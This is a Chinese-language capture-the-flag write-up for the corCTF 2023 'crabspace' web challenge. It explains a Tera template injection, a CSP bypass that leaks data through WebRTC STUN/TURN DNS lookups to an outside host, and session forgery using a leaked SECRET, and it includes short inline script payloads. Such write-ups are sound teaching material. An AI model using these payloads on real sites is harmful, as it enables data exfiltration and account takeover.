---
tags: 
  - Rust
  - TODO
---


# corctf 2023

## crabspace

题目是用 Rust 写的， axum 作为 http Server， tera 作为模板渲染引擎。flag 是 admin 的 pass，给了一个 adminbot，所以存在 xss。

提供的操作很简单，注册，登录，写内容到 space。

### SSTI 拿 admin id

审计代码可以发现存在一处 SSTI:

![](https://cdn.silente.top/img/202308150007797.png)

即对于用户可控的 space，先对其进行了一次 Tera::one_off 渲染，然后再将结果给插入 `space` 上下文中进行最后的渲染。这里由于 space 可控，所以可以构造 SSTI。

效果：

![](https://cdn.silente.top/img/202308150008876.png)

![](https://cdn.silente.top/img/202308150009920.png)

在 pre request 处理中可以看到已经把 user 除了 pass 的其他信息都放在了 ctx 中：

![](https://cdn.silente.top/img/202308150037792.png)

所以能够直接使用 `{{ user.id }}` 来拿到当前 user 的 uuid。但这里有个问题是如何带出 admin 的 uuid，看来需要用到 xss 的方法。

### XSS dns 外带

看看策略：

![](https://cdn.silente.top/img/202308142136554.png)

首先是熟悉的 CSP 策略，可以得到：

> - `style` 只信任同域名的资源
> - `script` 只加载内联脚本资源
> - 禁止在 iframe 中嵌入页面
> - 其他资源不允许加载

然后是 COOP 策略：`same-origin` 不允许 pop up。尝试在 space 里 `location.href = '/'` 时发现被屏蔽，看源码可以知道：

![](https://cdn.silente.top/img/202308142359326.png)

也就是说我们能够写内联 js 脚本，但其内容会放在一个完全隔离的上下文环境中，并且由于 `frame-ancestors 'none'` 以及 COOP 策略的限制，我们不能使用 `window.open` 之类的方法弹出新窗口，也不能使用 `window.parent` 之类的方法访问父窗口。

目前的一个想法是看能否使用 `postMessage` 之类的方法来进行通信，但是由于 default-src 默认 none， connect-src 同样是 none。

![](https://cdn.silente.top/img/202308151015849.png)

翻一翻 hacktricks 可以找到对于 WebRTC 的利用：

![](https://cdn.silente.top/img/202308151013620.png)

不过这里下面也说了似乎不太可能被利用了。

尝试了一下:

```html
<script>pc=new RTCPeerConnection({"iceServers":[{"urls":["turn:114514.pretzel186.messwithdns.com"],"username":"123","credential":"."}]});pc.createOffer().then(a=>pc.setLocalDescription(a));</script>
```

可以发现

![](https://cdn.silente.top/img/202308151409061.png)

不知道为什么行不通。在官方 wp 中可以看到也是利用了 WebRTC，但是利用了 DNS Prefetch:

```html
<script>pc=new RTCPeerConnection({"iceServers":[{"url":"stun:se.pretzel186.messwithdns.com"}]});pc.createOffer({offerToReceiveAudio:1}).then(a=>pc.setLocalDescription(a));</script>
```

有区别的地方在于首先将 turn 换成了 stun 来节省长度（限制了 space 长度 <= 200）；然后是给 `createOffer` 提供了 offerToReceiveAudio 参数：

![](https://cdn.silente.top/img/202308151623691.png)

这样 RTC 便能够主动地解析 dns 地址。然后跟 SSTI 结合就能够达到外带 admin id 的效果。

### 伪造 admin session

继续审计代码，可以发现有个 admin 路由，功能是展示当前所有的 User 信息：

```rust
#[derive(Serialize)]
struct UserView {
    id: Uuid,
    name: String,
    following: Vec<User>,
    followers: Vec<User>,
    space: String,
}

#[derive(Deserialize)]
struct AdminQuery {
    sort: Option<String>,
}

impl From<User> for UserView {
    fn from(u: User) -> Self {
        UserView {
            id: u.id,
            name: u.name,
            following: u
                .following
                .iter()
                .filter_map(|f| USERS.get(f).map(|f| f.clone()))
                .collect(),
            followers: u
                .followers
                .iter()
                .filter_map(|f| USERS.get(f).map(|f| f.clone()))
                .collect(),
            space: u.space,
        }
    }
}
```

![](https://cdn.silente.top/img/202308151630894.png)

可以发现 UserView 里面使用的是带有 pass 的 `Vec<User>`，而 tera 渲染时提供的 sort 能够让我们来泄露出 admin 的 pass。所以目前的问题是如何拿到 admin 的身份。

Tera 还有一个 Built-ins Func 是 `get_env`:

![](https://cdn.silente.top/img/202308151658429.png)

可以直接拿到 `SECRET` 变量来伪造 session 信息。

```rust
let secret: [u8; 64] = std::env::var("SECRET")
    .map(|p| p.as_bytes().try_into().expect("SECRET must be 64 bytes"))
    .unwrap_or_else(|_| [(); 64].map(|_| rand::thread_rng().gen()));
let session_layer = SessionLayer::new(store, &secret).with_secure(false);
```

查看中间件处理可以发现会使用 uuid 来拿到 user 信息，那么使用前面已经得到的 admin id 便能够伪造出 admin 的 session。

![](https://cdn.silente.top/img/202308151700856.png)

翻阅源码可以找到 axum session 的签名方法：

![](https://cdn.silente.top/img/202308151706186.png)

所以最后使用伪造的 admin 去访问 admin view，通过改变注册用户的 pass 以及 sort 参数来泄露出 flag。

### Ref

- https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- https://source.chromium.org/chromium
